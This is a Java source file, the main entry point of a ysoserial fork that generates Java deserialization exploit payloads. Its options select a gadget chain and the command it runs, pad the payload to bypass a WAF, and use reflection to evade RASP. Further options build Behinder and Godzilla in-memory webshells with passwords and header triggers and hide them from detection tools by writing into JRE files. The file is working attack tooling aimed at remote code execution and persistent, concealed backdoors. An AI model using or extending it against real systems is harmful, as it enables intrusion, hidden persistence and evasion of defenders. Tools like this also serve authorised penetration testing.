package org.su18.ysuserial;

import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.*;

import org.apache.commons.cli.*;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.ObjectPayload.Utils;

import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.dirty.DirtyDataWrapper;

import static org.su18.ysuserial.Strings.isFromExploit;
import static org.su18.ysuserial.payloads.config.Config.*;
import static org.su18.ysuserial.payloads.util.HexUtils.generatePassword;

public class GeneratePayload {

	public static CommandLine cmdLine;

	public static Object PAYLOAD = null;

	public static void main(final String[] args) {

		Options options = new Options();
		options.addOption("g", "gadget", true, "Java deserialization gadget");
		options.addOption("p", "parameters", true, "Gadget parameters");
		options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
		options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
		options.addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)");
		options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
		options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
		options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
		options.addOption("pw", "password", true, "Behinder or Godzilla password,default [p@ssw0rd]");
		options.addOption("gzk", "godzilla-key", true, "Godzilla key,default [key]");
		options.addOption("hk", "header-key", true, "MemoryShell Header Check,Request Header Key,default [Referer]");
		options.addOption("hv", "header-value", true, "MemoryShell Header Check,Request Header Value,default [https://su18.org/]");
		options.addOption("ch", "cmd-header", true, "Request Header which pass the command to Execute,default [X-Token-Data]");
		options.addOption("gen", "gen-mem-shell", false, "Write Memory Shell Class to File");
		options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
		options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools (type 2 only support SpringControllerMS)");
		options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
		options.addOption("rh", "rhino", false, "ScriptEngineManager Using Rhino Engine to eval JS");
		options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
		options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
		options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");

		CommandLineParser parser = new DefaultParser();

		if (args.length == 0) {
			printUsage(options);
			System.exit(1);
		}

		try {
			cmdLine = parser.parse(options, args);
		} catch (Exception e) {
			System.out.println("[*] Parameter input error, please use -h for more information");
			printUsage(options);
			System.exit(1);
		}

		if (cmdLine.hasOption("inherit")) {
			IS_INHERIT_ABSTRACT_TRANSLET = true;
		}

		if (cmdLine.hasOption("obscure")) {
			IS_OBSCURE = true;
		}

		if (cmdLine.hasOption("cmd-header")) {
			CMD_HEADER_STRING = cmdLine.getOptionValue("cmd-header");
		}

		if (cmdLine.hasOption("url")) {
			String url = cmdLine.getOptionValue("url");
			if (!url.startsWith("/")) {
				url = "/" + url;
			}
			URL_PATTERN = url;
		}

		if (cmdLine.hasOption("define-class-from-parameter")) {
			PARAMETER = cmdLine.getOptionValue("define-class-from-parameter");
		}

		if (cmdLine.hasOption("file")) {
			WRITE_FILE = true;
			FILE = cmdLine.getOptionValue("file");
		}

		if (cmdLine.hasOption("password")) {
			PASSWORD_ORI = cmdLine.getOptionValue("password");
			PASSWORD = generatePassword(PASSWORD_ORI);
		}

		if (cmdLine.hasOption("godzilla-key")) {
			GODZILLA_KEY = generatePassword(cmdLine.getOptionValue("godzilla-key"));
		}

		if (cmdLine.hasOption("header-key")) {
			HEADER_KEY = cmdLine.getOptionValue("header-key");
		}

		if (cmdLine.hasOption("header-value")) {
			HEADER_VALUE = cmdLine.getOptionValue("header-value");
		}

		if (cmdLine.hasOption("no-com-sun")) {
			FORCE_USING_ORG_APACHE_TEMPLATESIMPL = true;
		}

		if (cmdLine.hasOption("mozilla-class-loader")) {
			USING_MOZILLA_DEFININGCLASSLOADER = true;
		}

		if (cmdLine.hasOption("rhino")) {
			USING_RHINO = true;
		}

		if (cmdLine.hasOption("gen-mem-shell")) {
			GEN_MEM_SHELL = true;

			if (cmdLine.hasOption("gen-mem-shell-name")) {
				GEN_MEM_SHELL_FILENAME = cmdLine.getOptionValue("gen-mem-shell-name");
			}
		}

		if (cmdLine.hasOption("hide-mem-shell")) {
			HIDE_MEMORY_SHELL = true;

			if (cmdLine.hasOption("hide-type")) {
				HIDE_MEMORY_SHELL_TYPE = Integer.parseInt(cmdLine.getOptionValue("hide-type"));
			}
		}

		final String payloadType = cmdLine.getOptionValue("gadget");
		final String command     = cmdLine.getOptionValue("parameters");

		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage(options);
			System.exit(1);
			return;
		}


		try {
			ObjectPayload payload = payloadClass.newInstance();
			Object        object  = payload.getObject(command);

			// 是否指定混淆
			if (cmdLine.hasOption("dirty-type") && cmdLine.hasOption("dirty-length")) {
				int type   = Integer.parseInt(cmdLine.getOptionValue("dirty-type"));
				int length = Integer.parseInt(cmdLine.getOptionValue("dirty-length"));
				object = new DirtyDataWrapper(object, type, length).doWrap();
			}

			// 储存生成的 payload
			PAYLOAD = object;
			if (isFromExploit()) {
				return;
			}

			OutputStream out;

			if (WRITE_FILE) {
				out = new FileOutputStream(FILE);
			} else {
				out = System.out;
			}
			Serializer.serialize(object, out);
			ObjectPayload.Utils.releasePayload(payload, object);

			out.flush();
			out.close();
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(1);
		}
		System.exit(0);
	}

	private static void printUsage(Options options) {

		System.err.println("            _.-^^---....,,--\n" +
				"       _--                  --_\n" +
				"      <                        >)\n" +
				"      |       Y Su Serial ?     |\n" +
				"       \\._                   _./\n" +
				"          ```--. . , ; .--'''\n" +
				"                | |   |\n" +
				"             .-=||  | |=-.\n" +
				"             `-=#$%&%$#=-'\n" +
				"                | ;  :|\n" +
				"       _____.,-#%&$@%#&#~,._____\n" +
				"     _____.,[ 暖风熏得游人醉 ],._____\n" +
				"     _____.,[ 直把杭州作汴州 ],._____"
		);
		System.err.println("[root]#~  Usage: java -jar ysoserial-[version]-su18-all.jar -g [payload] -p [command] [options]");
		System.err.println("[root]#~  Available payload types:");

		final List<Class<? extends ObjectPayload>> payloadClasses =
				new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
		Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

		final List<String[]> rows = new LinkedList<String[]>();
		rows.add(new String[]{"Payload", "Authors", "Dependencies"});
		rows.add(new String[]{"-------", "-------", "------------"});
		for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
			rows.add(new String[]{
					payloadClass.getSimpleName(),
					Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
					Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
			});
		}

		final List<String> lines = Strings.formatTable(rows);

		for (String line : lines) {
			System.err.println("     " + line);
		}

		System.err.println("\r\n");
		HelpFormatter helpFormatter = new HelpFormatter();
		helpFormatter.setWidth(Math.min(200, jline.Terminal.getTerminal().getTerminalWidth()));
		helpFormatter.printHelp("ysoserial-[version]-su18-all.jar", options, true);

		System.err.println("\r\n");
		System.err.println("Recommended Usage: -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i -f evil.ser");
		System.err.println("If you want your payload being extremely short，you could just use:");
		System.err.println("java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]' -i -f evil.ser");

	}
}
